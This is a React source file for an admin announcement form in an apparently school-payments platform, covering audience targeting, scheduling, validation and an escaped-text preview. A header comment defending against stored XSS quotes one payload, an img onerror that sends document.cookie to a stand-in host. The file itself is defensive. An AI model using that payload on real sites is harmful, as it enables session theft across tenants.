import React, { useCallback, useEffect, useMemo, useState } from 'react';
import { CircleAlert, Eye, Info } from 'lucide-react';
import Card from '../../../components/dashboard/ui/Card';
import Badge from '../../../components/dashboard/ui/Badge';
import { Field, FormAlert, SelectField } from '../../../components/common/FormField';
import SchoolPicker from '../../../components/admin/sms/SchoolPicker';
import { ANNOUNCEMENT_AUDIENCES, ANNOUNCEMENT_SEVERITIES } from '../../../services/admin';
import { formatCount } from '../../../utils/format';

/**
 * The one form behind `/admin/announcements/new` and `/admin/announcements/:id`.
 *
 * Both routes share it rather than having two screens that drift. The rules it has
 * to satisfy come from three layers and each of them exists because of a specific
 * failure the UI would otherwise produce:
 *
 * ## `targetSchoolIds` is required for `selected_schools` and forbidden otherwise
 *
 * This is an **inversion**, and it is the opposite of what "allow targeting"
 * suggests. `assertAudienceConsistent` (`announcements.service.js:140-161`) refuses
 * an empty list when the audience is `selected_schools` with a 400, and refuses a
 * non-empty list on `all_schools` or `all_admins` with a 400. The reason is in the
 * service and it is the right one: `targetSchoolIds` is only ever *consulted* when
 * the audience is `selected_schools`, so storing it otherwise leaves a document
 * claiming a targeting that no read path honours — an operator reading
 * `all_schools` next to a three-school list cannot tell whether those three were a
 * filter or a leftover from an earlier edit.
 *
 * Two things follow for this form, and the second is the one usually missed:
 *
 *   1. **The picker is rendered only for `selected_schools`.** Leaving a school
 *      list visible-but-ignored while the audience is `all_schools` reads as a
 *      broken control, and the operator's reasonable conclusion — "school
 *      selection is broken" — sends them hunting a bug that does not exist.
 *   2. **The payload omits the field entirely when it does not apply.** Not
 *      `targetSchoolIds: []`, not `targetSchoolIds: undefined` on the wire — the
 *      key is not built. On a *patch* that is the sharper edge: `updateAnnouncement`
 *      merges the payload into the stored document
 *      (`announcements.service.js:397-402`), so sending an empty array when
 *      editing a `selected_schools` notice down to `all_schools` would clear the
 *      stored ids — correct in that case, and destructive in every other. Omitting
 *      the key when the audience is `selected_schools` *preserves* the stored
 *      targeting on a patch that only changes the title, which is what an editor
 *      expects.
 *
 * ## `endsAt` is validated against `startsAt` here, and the server still validates it
 *
 * `createAnnouncement` returns a 422 `INVALID_ANNOUNCEMENT_WINDOW`
 * (`announcements.service.js:305-311`) and `updateAnnouncement` re-checks against
 * the **merged** document, so a patch that moves `startsAt` past a stored `endsAt`
 * is caught there too. The client-side check is for a message that names the
 * problem instead of returning the server's ISO strings to an operator looking at
 * two date boxes. It is not a replacement: the form sends `endsAt` as `null` when
 * it is blank — `null` is the stored meaning of "no end date", and the Joi schema
 * has `.allow(null)` for exactly that (`admin.announcements.validation.js:142`) —
 * so an open-ended notice is expressed rather than omitted.
 *
 * ## Why there is no `dangerouslySetInnerHTML` anywhere in this file
 *
 * The body is content authored by a **platform operator** and rendered in **every
 * school console** on the platform — `all_schools` is one document displayed to
 * every paying tenant, which makes it the highest-reach field in the product and
 * the most attractive stored-XSS target in it. A payload of
 * `<img src=x onerror=fetch('//evil/'+document.cookie)>` posted through this form
 * would execute with a school administrator's session in **every** school at once,
 * and a school administrator session is a payment-taking session.
 *
 * React's default rendering escapes the string, so `<b>` shows as `<b>` and a
 * `javascript:` URL is text. That is the behaviour this form relies on and it is
 * why the preview below uses `{body}` inside a `<pre>`. The rejected alternative
 * was a small sanitiser plus `dangerouslySetInnerHTML`, on the reasoning that
 * operators might want formatting — and that is the wrong trade for a field whose
 * only legitimate content is two or three sentences of plain-language notice read
 * on a phone. Line breaks are preserved with `whitespace-pre-wrap` rather than by
 * emitting `<br>`, which keeps the value the operator typed identical to the value
 * stored and shown.
 *
 * ## Dates, and the one thing that goes wrong here
 *
 * `<input type="datetime-local">` yields a **local wall-clock** string with no
 * timezone (`2026-10-04T02:00`), while the Joi schema wants an ISO instant
 * (`.date().iso()`). Sending the raw input value would make "Saturday 02:00" mean
 * whatever UTC offset the operator's laptop happens to have — a notice about a
 * 02:00–06:00 GMT maintenance window published from a laptop in Accra at
 * `2026-10-04T02:00` would go live at 02:00 *local*, i.e. 02:00 GMT, which happens
 * to be right, and would be wrong by an hour for anybody else. `toIso` converts
 * through `new Date(value)` — which parses a datetime-local string as local time —
 * and `toLocalInput` converts back for the edit form. Both directions are written
 * out rather than inlined because a one-character slip here is invisible on screen
 * and wrong on every school console.
 */

const TITLE_MAX = 150;
const BODY_MAX = 2000;

/** `createAnnouncementSchema`'s bounds, so the form fails the same way the server does. */
const LIMITS = { title: TITLE_MAX, body: BODY_MAX };

const SEVERITY_TONES = { info: 'blue', warning: 'amber', critical: 'red' };

const SEVERITY_HELP = {
  info: 'Neutral information. Shown as a routine banner.',
  warning: 'Something needs attention soon. Visually elevated in the school console.',
  critical: 'An outage or a deadline. The most prominent state the school console has.',
};

const AUDIENCE_HELP = {
  all_schools: 'Every active school on the platform. Archived schools are skipped.',
  selected_schools: 'Only the schools you name below. Requires at least one.',
  all_admins: 'Every school administrator, without the notice being shown to the whole school.',
};

const AUDIENCE_LABELS = {
  all_schools: 'Every school',
  selected_schools: 'Selected schools',
  all_admins: 'Every school administrator',
};

const SEVERITY_LABELS = {
  info: 'Information',
  warning: 'Warning',
  critical: 'Critical',
};

/** An instant → the `YYYY-MM-DDTHH:mm` string a `datetime-local` input needs. */
const toLocalInput = (value) => {
  if (!value) return '';
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return '';
  // Offset by the local timezone before slicing, because `toISOString` is UTC and
  // slicing *that* would show the operator a time in the wrong zone.
  const local = new Date(date.getTime() - date.getTimezoneOffset() * 60000);
  return local.toISOString().slice(0, 16);
};

/** A `datetime-local` value → an ISO instant. `null` for an empty field. */
const toIso = (value) => {
  if (!value) return null;
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return null;
  return date.toISOString();
};

const AnnouncementForm = ({
  mode = 'create',
  initial = null,
  onSubmit,
  submitLabel,
  onCancel,
  extraActions,
}) => {
  const isEdit = mode === 'edit';

  const [title, setTitle] = useState(initial?.title || '');
  const [body, setBody] = useState(initial?.body || '');
  const [severity, setSeverity] = useState(initial?.severity || 'info');
  const [audience, setAudience] = useState(initial?.targetAudience || 'all_schools');
  const [schoolIds, setSchoolIds] = useState(
    // Stored ids are ObjectIds from the API. They are kept as strings — that is
    // what `SchoolPicker` compares on — and sent back as strings, which Joi's
    // `objectId` accepts.
    Array.isArray(initial?.targetSchoolIds) ? initial.targetSchoolIds.map(String) : []
  );
  const [startsAt, setStartsAt] = useState(() => toLocalInput(initial?.startsAt));
  const [endsAt, setEndsAt] = useState(() => toLocalInput(initial?.endsAt));
  const [isActive, setIsActive] = useState(initial?.isActive !== false);

  const [busy, setBusy] = useState(false);
  const [formError, setFormError] = useState(null);
  const [showPreview, setShowPreview] = useState(false);

  /**
   * Re-seed when a *different* announcement arrives.
   *
   * Keyed on the id rather than on `initial`'s identity, because `AnnouncementEdit`
   * re-renders with a fresh object literal on every parent render — seeding on
   * identity would wipe the operator's unsaved edits on each keystroke somewhere
   * upstream. Seeding once per id is what a load-once form actually wants.
   */
  const seededFor = initial?._id || null;
  useEffect(() => {
    if (!initial) return;
    setTitle(initial.title || '');
    setBody(initial.body || '');
    setSeverity(initial.severity || 'info');
    setAudience(initial.targetAudience || 'all_schools');
    setSchoolIds(Array.isArray(initial.targetSchoolIds) ? initial.targetSchoolIds.map(String) : []);
    setStartsAt(toLocalInput(initial.startsAt));
    setEndsAt(toLocalInput(initial.endsAt));
    setIsActive(initial.isActive !== false);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [seededFor]);

  /** The single flag that decides whether the picker exists and the key is sent. */
  const needsSchools = audience === 'selected_schools';

  const trimmedTitle = title.trim();
  const trimmedBody = body.trim();
  const startsIso = toIso(startsAt);
  const endsIso = toIso(endsAt);

  /**
   * Client-side window check.
   *
   * `<=` and not `<`, matching the server's `ends.getTime() <= starts.getTime()`
   * (`announcements.service.js:305`) — a window that closes at the instant it opens
   * is never live, so it could not be shown to anybody even once.
   */
  const windowInvalid = Boolean(startsIso && endsIso && endsIso <= startsIso);

  const blockers = useMemo(() => {
    const list = [];
    if (!trimmedTitle) list.push('A notice needs a title — it is what appears in the banner.');
    if (!trimmedBody) list.push('Write the notice body.');
    if (!startsIso) list.push('Set when the notice starts.');
    if (needsSchools && schoolIds.length === 0) {
      list.push('Choose at least one school, or change the audience.');
    }
    if (windowInvalid) list.push('The end date must be after the start date.');
    return list;
  }, [trimmedTitle, trimmedBody, startsIso, needsSchools, schoolIds.length, windowInvalid]);

  const canSubmit = blockers.length === 0 && !busy;

  /**
   * The payload, and the reason it is built key by key.
   *
   * `targetSchoolIds` is added **only** when the audience is `selected_schools`,
   * so the key is absent rather than empty in every other case — see the header
   * note on why an empty array is not the same thing as no key, and why that
   * matters on a patch.
   */
  const buildPayload = useCallback(() => {
    const payload = {
      title: trimmedTitle,
      body: trimmedBody,
      severity,
      targetAudience: audience,
      startsAt: startsIso,
      // `null`, not omitted: an open-ended notice has to be expressible on a
      // patch that is clearing a previously-set end date, and the Joi schema
      // carries `.allow(null)` for precisely that.
      endsAt: endsIso,
    };

    if (needsSchools) {
      payload.targetSchoolIds = schoolIds;
    }

    if (isEdit) {
      payload.isActive = isActive;
    }

    return payload;
  }, [
    trimmedTitle,
    trimmedBody,
    severity,
    audience,
    startsIso,
    endsIso,
    needsSchools,
    schoolIds,
    isEdit,
    isActive,
  ]);

  /**
   * Submit, returning `{ ok, error }` and never throwing.
   *
   * `onSubmit` is the route wrapper's, which calls `createAnnouncement` or
   * `updateAnnouncement` and catches. This handler branches on the result rather
   * than on an exception, so a 422 or a dropped connection leaves the form
   * mounted with everything the operator typed — which is the whole point of the
   * conventions' §4 rule.
   */
  const submit = async (event) => {
    event?.preventDefault?.();
    if (!canSubmit) {
      setFormError(blockers[0]);
      return { ok: false, error: blockers[0] };
    }

    setBusy(true);
    setFormError(null);
    const result = await onSubmit(buildPayload());
    setBusy(false);

    if (result?.ok) return { ok: true };

    setFormError(result?.error || 'This announcement could not be saved.');
    return { ok: false, error: result?.error };
  };

  const characterCount = body.length;

  return (
    <form onSubmit={submit} noValidate className="space-y-4">
      {formError && <FormAlert tone="error">{formError}</FormAlert>}

      <Card padding="p-5">
        <h2 className="text-sm font-extrabold text-ink">The notice</h2>
        <p className="mt-0.5 text-[12px] font-medium text-slate-500">
          Shown in school dashboards to{' '}
          {needsSchools
            ? `${formatCount(schoolIds.length)} selected school${schoolIds.length === 1 ? '' : 's'}`
            : 'every school on the platform'}
          .
        </p>

        <div className="mt-4 space-y-4">
          <Field
            label="Title"
            required
            value={title}
            maxLength={LIMITS.title}
            onChange={(event) => setTitle(event.target.value)}
            placeholder="Scheduled maintenance on Saturday"
            hint={`${trimmedTitle.length}/${LIMITS.title}`}
          />

          <div>
            {/*
              The body. A `<textarea>`, rendered as text everywhere including the
              preview below — see the header note for why `dangerouslySetInnerHTML`
              appears nowhere in this console.
            */}
            <label
              htmlFor="announcement-body"
              className="mb-0.5 flex items-baseline justify-between gap-3 text-[11px] font-semibold text-slate-700"
            >
              <span>
                Body <span className="text-red-600">*</span>
              </span>
              <span className="shrink-0 text-[10px] font-medium text-slate-500">
                {formatCount(characterCount)}/{LIMITS.body}
              </span>
            </label>
            <textarea
              id="announcement-body"
              value={body}
              maxLength={LIMITS.body}
              rows={7}
              onChange={(event) => setBody(event.target.value)}
              placeholder="SukuuPay will be unavailable on Saturday between 02:00 and 06:00 GMT for scheduled maintenance. No action is needed."
              aria-describedby="announcement-body-help"
              className="w-full resize-y rounded-xl border border-slate-200 bg-white p-3 text-[13px] font-medium leading-relaxed text-ink placeholder:font-normal placeholder:text-slate-400 focus:border-brand-700 focus:outline-none focus:ring-2 focus:ring-brand-700/30"
            />
            <p id="announcement-body-help" className="mt-1 text-[11px] font-semibold text-slate-400">
              Plain text. Line breaks are preserved; HTML is displayed as written rather than
              rendered, because this notice is authored on the platform and shown to every school.
            </p>
          </div>

          <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
            <SelectField
              label="Severity"
              value={severity}
              onChange={(event) => setSeverity(event.target.value)}
            >
              {ANNOUNCEMENT_SEVERITIES.map((value) => (
                <option key={value} value={value}>
                  {SEVERITY_LABELS[value] || value}
                </option>
              ))}
            </SelectField>

            <SelectField
              label="Audience"
              required
              value={audience}
              onChange={(event) => setAudience(event.target.value)}
            >
              {ANNOUNCEMENT_AUDIENCES.map((value) => (
                <option key={value} value={value}>
                  {AUDIENCE_LABELS[value] || value}
                </option>
              ))}
            </SelectField>
          </div>

          <div className="flex items-start gap-1.5 text-[11px] font-semibold leading-relaxed text-slate-500">
            <Info className="mt-0.5 h-3.5 w-3.5 shrink-0 text-slate-400" aria-hidden="true" />
            <span>
              <Badge tone={SEVERITY_TONES[severity] || 'slate'}>
                {SEVERITY_LABELS[severity] || severity}
              </Badge>{' '}
              {SEVERITY_HELP[severity] || ''} {AUDIENCE_HELP[audience] || ''}
            </span>
          </div>

          {/*
            The preview. Not decoration: a notice body read on a phone wraps
            differently than one read in a 900px text box, and the last line of a
            five-line paragraph is where a warning gets lost. `whitespace-pre-wrap`
            preserves the operator's own line breaks without introducing markup.
          */}
          <div>
            <button
              type="button"
              onClick={() => setShowPreview((open) => !open)}
              aria-expanded={showPreview}
              className="inline-flex items-center gap-1.5 text-[11px] font-extrabold text-brand-700 underline-offset-2 hover:underline focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-brand-700/40"
            >
              <Eye className="h-3.5 w-3.5" aria-hidden="true" />
              {showPreview ? 'Hide preview' : 'Preview as schools will see it'}
            </button>

            {showPreview && (
              <div className="mt-2 rounded-xl border border-slate-200 bg-slate-50/60 p-4">
                <p className="text-[10px] font-extrabold uppercase tracking-wider text-slate-400">
                  In the school dashboard
                </p>
                <div className="mt-2 rounded-xl border border-slate-200 bg-white p-3.5 shadow-soft">
                  <div className="flex flex-wrap items-center gap-2">
                    <Badge tone={SEVERITY_TONES[severity] || 'slate'}>
                      {SEVERITY_LABELS[severity] || severity}
                    </Badge>
                    <span className="text-[10px] font-semibold text-slate-400">
                      {startsAt ? toLocalInput(startsAt).replace('T', ' ') : 'not scheduled'}
                      {endsAt ? ` → ${toLocalInput(endsAt).replace('T', ' ')}` : ' · no end date'}
                    </span>
                  </div>
                  <h3 className="mt-2 text-[14px] font-extrabold text-ink">
                    {trimmedTitle || 'Untitled notice'}
                  </h3>
                  {/*
                    The whole of the XSS argument in one expression: React escapes
                    this string. If an operator types markup here it appears as the
                    characters they typed.
                  */}
                  <p className="mt-1.5 whitespace-pre-wrap text-[13px] font-medium leading-relaxed text-slate-600">
                    {trimmedBody || 'Nothing written yet.'}
                  </p>
                </div>
              </div>
            )}
          </div>
        </div>
      </Card>

      <Card padding="p-5">
        <h2 className="text-sm font-extrabold text-ink">When it runs</h2>
        <p className="mt-0.5 text-[12px] font-medium text-slate-500">
          A notice can be written now and shown later. It becomes live on its start date and stops
          on its end date; leaving the end blank means it runs until it is withdrawn.
        </p>

        <div className="mt-4 grid grid-cols-1 gap-4 sm:grid-cols-2">
          <Field
            label="Starts"
            required
            type="datetime-local"
            value={startsAt}
            onChange={(event) => setStartsAt(event.target.value)}
            error={startsAt && !startsIso ? 'That is not a date the platform can read.' : null}
          />

          <Field
            label="Ends (optional)"
            type="datetime-local"
            value={endsAt}
            onChange={(event) => setEndsAt(event.target.value)}
            error={
              windowInvalid
                ? 'Must be after the start — a window that closes when it opens is never live.'
                : null
            }
          />
        </div>

        <p className="mt-2 text-[11px] font-semibold leading-relaxed text-slate-400">
          Times are read in this browser&rsquo;s timezone and stored as an instant. The end is
          exclusive: a notice whose window closes at 09:00 is no longer live at 09:00.
        </p>

        {/*
          `isActive` is only offered on an edit.

          On create it is always true — `createAnnouncement` hard-codes
          `isActive: true` (`announcements.service.js:323`) and writes no field — so
          a create-time toggle would be a control that does nothing. On edit it is
          the same switch `DELETE` flips, and the schema carries it deliberately:
          re-activating a notice withdrawn by accident is "a real and common
          recovery" (`admin.announcements.validation.js:162-163`). That is the
          reason the console can undo a withdrawal at all.
        */}
        {isEdit && (
          <label className="mt-4 flex cursor-pointer items-start gap-3 rounded-xl border border-slate-200 bg-white p-3.5">
            <input
              type="checkbox"
              checked={isActive}
              onChange={(event) => setIsActive(event.target.checked)}
              className="mt-0.5 h-4 w-4 shrink-0 accent-brand-700"
            />
            <span className="min-w-0">
              <span className="block text-[13px] font-extrabold text-ink">Active</span>
              <span className="mt-0.5 block text-[12px] font-medium leading-snug text-slate-500">
                {isActive
                  ? 'This notice can be shown when its window opens. Unticking it is the same operation as Withdraw, and it is how a withdrawn notice is brought back.'
                  : 'Switched off. No school console will show it, whatever its dates say. This is the state Withdraw leaves a notice in.'}
              </span>
            </span>
          </label>
        )}
      </Card>

      {/*
        The targeting card, rendered only for `selected_schools`.

        Unmounting rather than hiding is deliberate. A picker that is present but
        ignored fills the form with a control that appears broken, and an operator
        who selects a school under an `all_schools` audience has been told — by the
        control being there — that their selection means something. It does not,
        and the server refuses the request if it is sent.
      */}
      {needsSchools && (
        <Card padding="p-5">
          <h2 className="text-sm font-extrabold text-ink">Which schools</h2>
          <p className="mt-0.5 mb-3 text-[12px] font-medium text-slate-500">
            At least one is required. Schools not chosen will not see this notice at all.
          </p>
          <SchoolPicker
            label="Schools"
            required
            value={schoolIds}
            onChange={setSchoolIds}
            // No `filterStatus`: a notice for a suspended school is legitimate —
            // that the school is suspended is frequently why the notice exists.
          />
        </Card>
      )}

      {/* Blockers, stated rather than left as a disabled button. */}
      {blockers.length > 0 && (
        <div className="rounded-xl border border-amber-200 bg-amber-50 px-3.5 py-3">
          {blockers.map((blocker) => (
            <p
              key={blocker}
              className="flex items-start gap-1.5 text-[12px] font-semibold leading-relaxed text-amber-800"
            >
              <CircleAlert className="mt-0.5 h-3.5 w-3.5 shrink-0" aria-hidden="true" />
              {blocker}
            </p>
          ))}
        </div>
      )}

      <div className="flex flex-wrap items-center justify-end gap-2">
        {onCancel && (
          <button
            type="button"
            onClick={onCancel}
            disabled={busy}
            className="rounded-xl border border-slate-200 bg-white px-4 py-2.5 text-sm font-extrabold text-slate-700 transition-colors hover:bg-slate-50 disabled:opacity-60"
          >
            Cancel
          </button>
        )}
        {extraActions}

        <button
          type="submit"
          disabled={!canSubmit}
          className="inline-flex items-center gap-2 rounded-xl bg-brand-700 px-5 py-2.5 text-sm font-extrabold text-white shadow-lift transition-colors hover:bg-brand-800 disabled:cursor-not-allowed disabled:opacity-50 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-brand-700/40"
        >
          {busy
            ? 'Saving…'
            : submitLabel || (isEdit ? 'Save changes' : 'Publish announcement')}
        </button>
      </div>
    </form>
  );
};

export { toLocalInput, toIso, LIMITS };
export default AnnouncementForm;